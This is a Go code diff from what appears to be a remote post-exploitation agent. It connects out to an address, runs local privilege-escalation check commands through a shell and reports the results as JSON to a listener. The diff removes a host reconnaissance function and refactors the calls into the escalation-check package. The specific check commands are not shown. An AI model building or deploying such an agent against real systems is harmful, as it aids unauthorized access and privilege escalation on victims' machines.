@@ -8,48 +8,8 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strings"
-
-	"zheng/lpe"
 )
-
-func gatherRecon(conn net.Conn) lpe.Recon {
-	hostname, _ := os.Hostname()
-	username := os.Getenv("USER")
-	if username == "" {
-		username = os.Getenv("LOGNAME")
-	}
-	return lpe.Recon{
-		Hostname: hostname,
-		Username: username,
-		OS:       runtime.GOOS,
-		Arch:     runtime.GOARCH,
-		Kernel:   runtime.GOOS,
-		IP:       getLocalIP(),
-		PublicIP: getPublicIP(conn),
-	}
-}
-
-func getPublicIP(conn net.Conn) string {
-	tcpAddr := conn.LocalAddr().(*net.TCPAddr)
-	return tcpAddr.IP.String()
-}
-
-func getLocalIP() string {
-	addrs, err := net.InterfaceAddrs()
-	if err != nil {
-		return "unknown"
-	}
-	for _, addr := range addrs {
-		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
-			if ipnet.IP.To4() != nil {
-				return ipnet.IP.String()
-			}
-		}
-	}
-	return "unknown"
-}
 
 func main() {
 	connectAddr := flag.String("connect", "", "address to connect to (ip:port)")
@@ -112,14 +72,12 @@ func main() {
 			fmt.Fprintf(os.Stderr, "running LPE checks...\n")
 			encoder.Encode(map[string]string{"status": "lpe_running"})
 
-			// Send list of available checks
 			var checkNames []string
-			for _, ch := range lpe.Checks {
+			for _, ch := range lpeChecks {
 				checkNames = append(checkNames, ch.Name)
 			}
 			encoder.Encode(map[string]interface{}{"status": "lpe_checks", "checks": checkNames})
 
-			// Wait for skip list from listener
 			var skipMsg struct {
 				Cmd  string   `json:"cmd"`
 				Skip []string `json:"skip"`
@@ -134,15 +92,14 @@ func main() {
 				skipSet[s] = true
 			}
 
-			// Run checks, send progress for each
 			results := make(map[string]string)
-			for _, ch := range lpe.Checks {
+			for _, ch := range lpeChecks {
 				if skipSet[ch.Name] {
 					encoder.Encode(map[string]string{"status": "lpe_skip", "name": ch.Name})
 					continue
 				}
 				encoder.Encode(map[string]string{"status": "lpe_check", "name": ch.Name, "cmd": ch.Command})
-				results[ch.Name] = lpe.RunShell(ch.Command)
+				results[ch.Name] = runShell(ch.Command)
 			}
 
 			encoder.Encode(results)
